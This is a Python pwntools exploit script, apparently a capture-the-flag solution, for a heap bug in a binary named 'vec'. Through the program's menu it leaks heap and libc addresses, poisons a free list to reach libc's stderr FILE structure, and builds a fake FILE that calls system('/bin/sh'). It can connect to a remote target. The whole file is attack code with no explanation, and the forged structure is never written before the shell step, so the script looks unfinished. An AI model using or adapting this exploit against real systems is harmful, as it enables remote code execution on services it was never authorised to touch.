#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
#import os
code = ELF('./vec', checksec=False)
context.arch = code.arch
context.log_level = 'debug'
binsh = lambda : next(libc.search('/bin/sh'))
uu64 = lambda x: u64(x.ljust(8, '\0'))

def vset(idx, val):
    r.sendlineafter('>> ', '1')
    r.sendlineafter(': ', str(idx))
    r.sendlineafter(': ', str(val))

def vget(idx):
    r.sendlineafter('>> ', '2')
    r.sendlineafter(': ', str(idx))
    r.recvuntil(' = ')
    return int(r.recvuntil('\n'))

def vcopy(src, dst, count):
    r.sendlineafter('>> ', '3')
    r.sendlineafter(': ', str(src))
    r.sendlineafter(': ', str(dst))
    r.sendlineafter(': ', str(count))

def vclear():
    r.sendlineafter('>> ', '4')

def exploit(r):
    for i in range(0x1000/16+1):
        if i == 0x28:
            vset(i, 0x500)
        elif i == 0x29:
            vset(i, 0x501)
        else:
            vset(i, i)

    vclear()

    for i in range(16):
        vset(i, i)

    for i in range(18):
        vcopy(2, 1, -1)

    heap = vget(1) << 12
    heap -= 0x12000
    info('%#x heap', heap)

    vset(0, 0x501)
    vset(1, 0x501)
    vcopy(2, 1, -1)
    vclear()

    for i in range(8):
        vset(i, i)
    for i in range(4):
        vcopy(2, 1, -1)

    #info('%#x vget(6)', vget(6))
    libc.address = vget(6) - 0x219ce0
    info('%#x libc.address', libc.address)

    vset(0, 0x21)
    vset(1, 0x21)
    vcopy(2, 1, -1)
    vclear()

    for i in range(2):
        vset(i, i)

    vset(1, ( libc.sym['_IO_2_1_stderr_']+0x60) ^ (heap + 0x11f20) >> 12)
    #vset(1, ( heap+0x10) ^ (heap + 0x11f20) >> 12)
    vcopy(1, 2, -1)
    vset(1, 0x21)
    vcopy(1, 2, -1)
    for i in range(8):
        vset(1, 0x111*i)
        vcopy(1, 2, -1)

    vset(0, 0x301)
    vset(1, 0x301)
    vcopy(2, 1, -1)
    vclear()

    for i in range(2):
        vset(i, i)

    vset(0, 0)
    vset(1, 0)
    fakeio = fit({
        0x18: 1,
        0x20: 0,
        0x28: 1,
        0x30: 0,
        0x38: libc.sym['system'],
        0x48: binsh(),
        0x50: 1,
        0xd8: libc.address + 0x2163c0+0x20,
        0xe0: libc.sym['_IO_2_1_stderr_'],
    }, filler='\0')


    r.interactive()

if __name__ == '__main__':
    libc = ELF('./bc.so.6', checksec=False)
    if len(sys.argv) > 2:
        r = remote(sys.argv[1], int(sys.argv[2]))
    else:
        r = code.process()
    exploit(r)
